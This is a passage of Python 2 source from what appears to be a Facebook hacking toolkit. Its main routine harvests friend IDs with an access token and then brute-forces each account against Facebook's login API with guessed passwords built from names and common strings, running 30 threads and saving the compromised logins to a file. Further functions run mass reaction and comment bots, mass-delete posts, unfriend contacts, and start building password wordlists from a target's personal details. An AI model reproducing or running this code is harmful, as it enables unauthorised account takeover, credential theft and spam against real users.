		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Australia') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def fbbotx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. Bot Reactions Target Post'
    print '║-> \x1b[1;37;40m2. Bot Reactions Group Post'
    print '║-> \x1b[1;37;40m3. Bot Comment Target Post'
    print '║-> \x1b[1;37;40m4. Bot Comment Group Post'
    print '║-> \x1b[1;37;40m5. Mass Delete Post'
    print '║-> \x1b[1;37;40m6. Accept Friend Requests'
    print '║-> \x1b[1;37;40m7. Unfriends'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    fbbotx_pilih()
    


def fbbotx_pilih():
    bots = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if fbbotx == '':
        print '\x1b[1;91m[!] Can\'t empty'
        fbbotx_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mnot found'
                                        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '║-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '║-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '║-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '║-> \x1b[1;37;40m5. \x1b[1;97mSad'
    print '║-> \x1b[1;37;40m6. \x1b[1;97mAngry'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Can\'t empty'
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
                                    react_pilih()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '║-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '║-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '║-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '║-> \x1b[1;37;40m5. \x1b[1;97mSad'
    print '║-> \x1b[1;37;40m6. \x1b[1;97mAngry'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Can\'t empty'
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
                                    reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        print "\x1b[1;91m[!] \x1b[1;92mUse \x1b[1;97m'<>' \x1b[1;92m for newline"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mStarting remove status\x1b[1;97m ...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mFailed'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mRemoved'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Connection Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print '\x1b[1;91m[!] No friends request'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Failed'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print "\033[1;97m «--------------------------------------------»"

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print "\033[1;97m «--------------------------------------------»"
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mRemove\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()
   
def fbotherx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. Write Status'
    print '║-> \x1b[1;37;40m2. Make Wordlist'
    print '║-> \x1b[1;37;40m3. Account Checker'
    print '║-> \x1b[1;37;40m4. List Group'
    print '║-> \x1b[1;37;40m5. Profile Guard'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    pilih_fbotherx()


def pilih_fbotherx():
    other = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if other == '':
        print '\x1b[1;91m[!] Can\'t empty'
        pilih_fbotherx()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mnot found'
                                pilih_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mWrite status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] Can\'t empty'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print "\033[1;97m «--------------------------------------------»"
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print "\033[1;97m «--------------------------------------------»"
            print '\x1b[1;91m[?] \x1b[1;92mIthe complete target data below'
            print "\033[1;97m «--------------------------------------------»"
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mFirst Name \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mMiddle Name \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mLast Name \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNickname \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mDate of birth >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print "\033[1;97m «--------------------------------------------»"
            print '\x1b[1;91m[?] \x1b[1;93mFor SKIP Singles wrote :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mName Girlfriend \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mGirlfriend Nickname \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mBoyfriend Birth Date >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
